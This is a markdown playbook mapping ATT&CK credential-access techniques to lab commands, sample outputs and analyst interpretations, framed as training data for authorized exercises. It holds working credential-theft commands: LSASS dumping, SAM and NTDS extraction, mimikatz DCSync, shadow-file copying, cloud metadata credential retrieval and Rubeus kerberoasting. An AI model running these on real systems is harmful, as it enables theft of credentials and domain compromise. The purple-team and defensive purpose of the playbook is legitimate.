# Credential Access Enumeration Playbook (ATT&CK TA0006, Dataset-Ready)

> Purpose: provide realistic, high-value credential access training data with commands, tool outputs, and analyst interpretation.
> Scope: authorized lab and sanctioned exercises only.

Credential Access covers adversary techniques used to steal credentials and authentication material.

- ATT&CK Tactic ID: TA0006
- Core techniques in this playbook: T1212, T1187, T1606, T1056, T1556, T1111, T1621, T1040, T1003, T1528, T1649, T1558, T1539, T1552

---

## 0. Safety and Lab Controls

1. Run only in isolated labs or approved purple-team ranges.
2. Use synthetic credentials and disposable test identities.
3. Do not export real secrets outside controlled evidence paths.
4. Record all extraction attempts, even failed attempts.
5. Rotate all exposed credentials immediately after exercises.

### 0.1 Evidence Wrapper

```bash
mkdir -p evidence

run_credacc() {
  local technique="$1"
  local label="$2"
  shift 2
  local ts
  ts="$(date -u +%Y%m%dT%H%M%SZ)"
  echo "[$ts] [$technique] $label" | tee -a evidence/credential_access.log
  "$@" 2>&1 | tee "evidence/${ts}_${technique}_${label}.txt"
}
```

### 0.2 Training Record Schema

```json
{
  "technique": "T1003.001",
  "technique_name": "LSASS Memory",
  "scenario": "Operator captures LSASS dump in isolated Windows lab",
  "command": "procdump64.exe -ma lsass.exe C:\\Temp\\lsass.dmp",
  "tool_result": {"status":"success", "highlights":["Dump 1 initiated", "Dump 1 complete"]},
  "analyst_interpretation": "Credential material exposure likely; investigate post-dump access and transfer",
  "confidence": 0.97,
  "mitigation_hint": "Enable LSASS protection and credential guard"
}
```

---

## 1. Baseline Before Credential Collection

Scenario:
- Capture identity context, policy, and logging before simulation.

```bash
run_credacc "TA0006" "identity_baseline" sh -lc 'whoami; id; hostname; date -u'
run_credacc "TA0006" "auth_policy_baseline" sh -lc 'echo "collect lockout, MFA, and auth policy baseline"'
```

Example result:

```text
corp\\labuser
uid=1000(labuser) gid=1000(labuser)
LAB-WS-42
2026-04-21T13:18:42Z
```

---

## 2. T1003 OS Credential Dumping

Scenario:
- Adversary extracts credentials from memory, registry, domain databases, and Linux credential sources.

### T1003.001 LSASS Memory

```bash
run_credacc "T1003.001" "lsass_dump" procdump64.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp
run_credacc "T1003.001" "lsass_parse" pypykatz lsa minidump C:\\Temp\\lsass.dmp
```

Example:

```text
Dump 1 complete: C:\Temp\lsass.dmp
username: backupsvc
ntlm: aad3b435b51404eeaad3b435b51404ee:7f8e2d...
```

### T1003.002 Security Account Manager

```bash
run_credacc "T1003.002" "sam_hives" reg save HKLM\\SAM C:\\Temp\\sam.hiv /y
run_credacc "T1003.002" "system_hive" reg save HKLM\\SYSTEM C:\\Temp\\system.hiv /y
```

Example:

```text
The operation completed successfully.
```

### T1003.003 NTDS

```bash
run_credacc "T1003.003" "ntds_ifm" ntdsutil "ac i ntds" "ifm" "create full C:\\Temp\\ifm" q q
```

Example:

```text
IFM media created at C:\Temp\ifm
```

### T1003.004 LSA Secrets

```bash
run_credacc "T1003.004" "lsa_dump" secretsdump.py -system system.hiv -security security.hiv -sam sam.hiv LOCAL
```

Example:

```text
[*] Dumping LSA Secrets
$MACHINE.ACC:plain_password_hex:...
```

### T1003.005 Cached Domain Credentials

```bash
run_credacc "T1003.005" "cached_creds_query" reg query HKLM\\SECURITY\\Cache
```

Example:

```text
NL$1    REG_BINARY    01000000...
```

### T1003.006 DCSync

```bash
run_credacc "T1003.006" "dcsync_sim" mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
```

Example:

```text
Object RDN           : krbtgt
Hash NTLM            : 3e1f6b...
```

### T1003.007 Proc Filesystem

```bash
run_credacc "T1003.007" "proc_maps" sh -lc 'sudo cat /proc/$(pgrep -n sshd)/maps | head -n 20'
run_credacc "T1003.007" "proc_mem_sim" sh -lc 'echo "simulate controlled /proc/<pid>/mem access"'
```

Example:

```text
7f5d3f000000-7f5d3f021000 rw-p 00000000 00:00 0
simulate controlled /proc/<pid>/mem access
```

### T1003.008 /etc/passwd and /etc/shadow

```bash
run_credacc "T1003.008" "shadow_collect" sudo sh -lc 'cp /etc/passwd /tmp/passwd.lab; cp /etc/shadow /tmp/shadow.lab; ls -l /tmp/passwd.lab /tmp/shadow.lab'
run_credacc "T1003.008" "shadow_crack_prep" sh -lc 'unshadow /tmp/passwd.lab /tmp/shadow.lab > /tmp/unshadowed.lab'
```

Example:

```text
-rw-r--r-- 1 root root 2148 /tmp/passwd.lab
-r-------- 1 root root 1321 /tmp/shadow.lab
```

---

## 3. T1552 Unsecured Credentials

Scenario:
- Adversary searches for plaintext or weakly protected secrets in common storage locations.

### T1552.001 Credentials In Files

```bash
run_credacc "T1552.001" "grep_creds" sh -lc 'rg -n "password|passwd|api[_-]?key|token|secret" /home/labuser/projects -g "*.env" -g "*.conf" -g "*.yaml"'
```

### T1552.002 Credentials in Registry

```bash
run_credacc "T1552.002" "registry_autologon" reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword
```

### T1552.003 Shell History

```bash
run_credacc "T1552.003" "history_leak" sh -lc 'grep -Ein "password|token|aws|secret" ~/.bash_history ~/.zsh_history 2>/dev/null | head -n 20'
```

### T1552.004 Private Keys

```bash
run_credacc "T1552.004" "find_private_keys" sh -lc 'find $HOME -type f \( -name "*.pem" -o -name "*.pfx" -o -name "*.p12" -o -name "id_rsa" \) 2>/dev/null | head -n 30'
```

### T1552.005 Cloud Instance Metadata API

```bash
run_credacc "T1552.005" "imds_token" curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
run_credacc "T1552.005" "imds_role_creds" sh -lc 'TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"); curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/'
```

### T1552.006 Group Policy Preferences

```bash
run_credacc "T1552.006" "gpp_cpassword" sh -lc 'find /mnt/sysvol -name Groups.xml -o -name Services.xml 2>/dev/null | head -n 20'
```

### T1552.007 Container API

```bash
run_credacc "T1552.007" "docker_socket_probe" curl --unix-socket /var/run/docker.sock http://localhost/containers/json
run_credacc "T1552.007" "k8s_token_read" sh -lc 'cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 40 && echo'
```

### T1552.008 Chat Messages

```bash
run_credacc "T1552.008" "chat_secret_hunt" sh -lc 'echo "simulate search over exported Slack/Teams/Jira logs for exposed secrets"'
```

Example:

```text
Found 3 messages matching token regex in test export
```

---

## 4. T1056 Input Capture

Scenario:
- Adversary captures user-entered credentials from keyboard, GUI prompts, web portals, or API hooks.

### T1056.001 Keylogging

```bash
run_credacc "T1056.001" "keylog_sim" sh -lc 'echo "simulate keylogging event stream in controlled endpoint telemetry"'
```

### T1056.002 GUI Input Capture

```bash
run_credacc "T1056.002" "fake_prompt_sim" sh -lc 'echo "simulate spoofed OS credential prompt capture"'
```

### T1056.003 Web Portal Capture

```bash
run_credacc "T1056.003" "portal_capture_sim" sh -lc 'echo "simulate injected credential capture code on test VPN portal"'
```

### T1056.004 Credential API Hooking

```bash
run_credacc "T1056.004" "api_hook_sim" sh -lc 'echo "simulate hook on CredUIPromptForWindowsCredentials / PAM auth calls"'
```

---

## 5. T1556 Modify Authentication Process

Scenario:
- Adversary alters authentication flows to capture credentials or grant unauthorized access.

### T1556.001 Domain Controller Authentication

```bash
run_credacc "T1556.001" "dc_auth_patch_sim" sh -lc 'echo "simulate domain controller auth patch behavior in lab"'
```

### T1556.002 Password Filter DLL

```bash
run_credacc "T1556.002" "password_filter_reg" reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "Notification Packages"
```

### T1556.003 Pluggable Authentication Modules

```bash
run_credacc "T1556.003" "pam_stack_review" sh -lc 'grep -R "pam_" /etc/pam.d | head -n 30'
```

### T1556.004 Network Device Authentication

```bash
run_credacc "T1556.004" "net_device_auth_patch_sim" sh -lc 'echo "simulate patched network OS authentication routine"'
```

### T1556.005 Reversible Encryption

```bash
run_credacc "T1556.005" "reversible_encryption_flag" powershell -NoProfile -Command "Get-ADUser -Filter * -Properties AllowReversiblePasswordEncryption | Select-Object -First 5 SamAccountName,AllowReversiblePasswordEncryption"
```

### T1556.006 Multi-Factor Authentication

```bash
run_credacc "T1556.006" "mfa_policy_change_sim" sh -lc 'echo "simulate disabling MFA factor requirement in test tenant"'
```

### T1556.007 Hybrid Identity

```bash
run_credacc "T1556.007" "hybrid_sync_rule_sim" sh -lc 'echo "simulate tampering with Entra Connect sync/auth flow"'
```

### T1556.008 Network Provider DLL

```bash
run_credacc "T1556.008" "network_provider_order" reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order" /v ProviderOrder
```

### T1556.009 Conditional Access Policies

```bash
run_credacc "T1556.009" "ca_policy_change_sim" sh -lc 'echo "simulate risky conditional access exclusion for privileged account"'
```

---

## 6. T1606 Forge Web Credentials

Scenario:
- Adversary forges or replays web authentication artifacts to access SaaS/on-prem services.

### T1606.001 Web Cookies

```bash
run_credacc "T1606.001" "cookie_forge_sim" sh -lc 'echo "simulate crafted session cookie with stolen signing secret"'
```

### T1606.002 SAML Tokens

```bash
run_credacc "T1606.002" "saml_token_forge_sim" sh -lc 'echo "simulate forged SAML assertion using compromised token-signing cert"'
```

---

## 7. Kerberos, Tokens, and Certificates

## T1558 Steal or Forge Kerberos Tickets

### T1558.001 Golden Ticket

```bash
run_credacc "T1558.001" "golden_ticket_sim" sh -lc 'echo "simulate forged TGT creation with KRBTGT hash in lab"'
```

### T1558.002 Silver Ticket

```bash
run_credacc "T1558.002" "silver_ticket_sim" sh -lc 'echo "simulate forged TGS for service account SPN"'
```

### T1558.003 Kerberoasting

```bash
run_credacc "T1558.003" "kerberoast" Rubeus.exe kerberoast /outfile:C:\\Temp\\tgs_hashes.txt
```

### T1558.004 AS-REP Roasting

```bash
run_credacc "T1558.004" "asreproast" Rubeus.exe asreproast /outfile:C:\\Temp\\asrep_hashes.txt
```

### T1558.005 Ccache Files

```bash
run_credacc "T1558.005" "ccache_collect" sh -lc 'find /tmp /home -type f -name "krb5cc_*" 2>/dev/null | head -n 20'
```

## T1528 Steal Application Access Token

```bash
run_credacc "T1528" "token_steal_sim" sh -lc 'echo "simulate extraction of OAuth/JWT bearer token from app memory/session store"'
```

## T1649 Steal or Forge Authentication Certificates

```bash
run_credacc "T1649" "cert_export_sim" certutil -store my
run_credacc "T1649" "adcs_abuse_sim" sh -lc 'echo "simulate certificate request abuse against misconfigured AD CS template"'
```

## T1539 Steal Web Session Cookie

```bash
run_credacc "T1539" "cookie_theft_sim" sh -lc 'echo "simulate browser cookie extraction and replay in test SSO portal"'
```

---

## 8. Network and MFA Credential Interception

## T1187 Forced Authentication

```bash
run_credacc "T1187" "forced_auth_unc" sh -lc 'echo "simulate forced UNC path auth to attacker listener in lab"'
```

## T1111 Multi-Factor Authentication Interception

```bash
run_credacc "T1111" "mfa_intercept_sim" sh -lc 'echo "simulate reverse-proxy interception of MFA challenge-response flow"'
```

## T1621 Multi-Factor Authentication Request Generation

```bash
run_credacc "T1621" "mfa_push_flood_sim" sh -lc 'echo "simulate repeated MFA push requests to target user"'
```

## T1040 Network Sniffing

```bash
run_credacc "T1040" "sniffing_capture" sudo tcpdump -ni eth0 '(tcp port 80 or tcp port 389 or tcp port 445)' -c 50
```

Example:

```text
IP 10.20.30.15.49822 > 10.20.30.20.80: POST /login HTTP/1.1
IP 10.20.30.15.50311 > 10.20.30.10.389: LDAP bindRequest
```

---

## 9. T1212 Exploitation for Credential Access

Scenario:
- Adversary exploits vulnerable authentication components or identity infrastructure to obtain credentials.

```bash
run_credacc "T1212" "exploit_auth_surface_sim" sh -lc 'echo "simulate exploit against vulnerable auth plugin to extract credential material"'
```

Example:

```text
Exploit chain produced privileged read of credential-bearing structure in test environment
```

---

## 10. Label-Ready Examples (JSONL)

```json
{"technique":"T1003.001","command":"procdump64.exe -ma lsass.exe C:\\Temp\\lsass.dmp","result":"LSASS memory dump created","interpretation":"Credential material likely exposed"}
{"technique":"T1552.001","command":"rg -n 'password|token|secret' /home/labuser/projects","result":"Multiple plaintext secrets in config files","interpretation":"Insecure file-based credential storage detected"}
{"technique":"T1558.003","command":"Rubeus.exe kerberoast /outfile:C:\\Temp\\tgs_hashes.txt","result":"Service ticket hashes collected","interpretation":"Kerberoastable accounts identified for offline cracking"}
{"technique":"T1606.002","command":"simulate forged SAML assertion","result":"Test IdP accepted forged token in lab","interpretation":"Token-signing trust boundary compromised"}
{"technique":"T1621","command":"simulate repeated MFA request generation","result":"Multiple push prompts sent to one user","interpretation":"Potential MFA fatigue attack pattern"}
```

---

## 11. Coverage Checklist

- T1212 Exploitation for Credential Access
- T1187 Forced Authentication
- T1606 Forge Web Credentials
- T1606.001 Web Cookies
- T1606.002 SAML Tokens
- T1056 Input Capture
- T1056.001 Keylogging
- T1056.002 GUI Input Capture
- T1056.003 Web Portal Capture
- T1056.004 Credential API Hooking
- T1556 Modify Authentication Process
- T1556.001 Domain Controller Authentication
- T1556.002 Password Filter DLL
- T1556.003 Pluggable Authentication Modules
- T1556.004 Network Device Authentication
- T1556.005 Reversible Encryption
- T1556.006 Multi-Factor Authentication
- T1556.007 Hybrid Identity
- T1556.008 Network Provider DLL
- T1556.009 Conditional Access Policies
- T1111 Multi-Factor Authentication Interception
- T1621 Multi-Factor Authentication Request Generation
- T1040 Network Sniffing
- T1003 OS Credential Dumping
- T1003.001 LSASS Memory
- T1003.002 Security Account Manager
- T1003.003 NTDS
- T1003.004 LSA Secrets
- T1003.005 Cached Domain Credentials
- T1003.006 DCSync
- T1003.007 Proc Filesystem
- T1003.008 /etc/passwd and /etc/shadow
- T1528 Steal Application Access Token
- T1649 Steal or Forge Authentication Certificates
- T1558 Steal or Forge Kerberos Tickets
- T1558.001 Golden Ticket
- T1558.002 Silver Ticket
- T1558.003 Kerberoasting
- T1558.004 AS-REP Roasting
- T1558.005 Ccache Files
- T1539 Steal Web Session Cookie
- T1552 Unsecured Credentials
- T1552.001 Credentials In Files
- T1552.002 Credentials in Registry
- T1552.003 Shell History
- T1552.004 Private Keys
- T1552.005 Cloud Instance Metadata API
- T1552.006 Group Policy Preferences
- T1552.007 Container API
- T1552.008 Chat Messages

This document is optimized for training corpus generation: scenario + command + output + interpretation + mitigation cues.
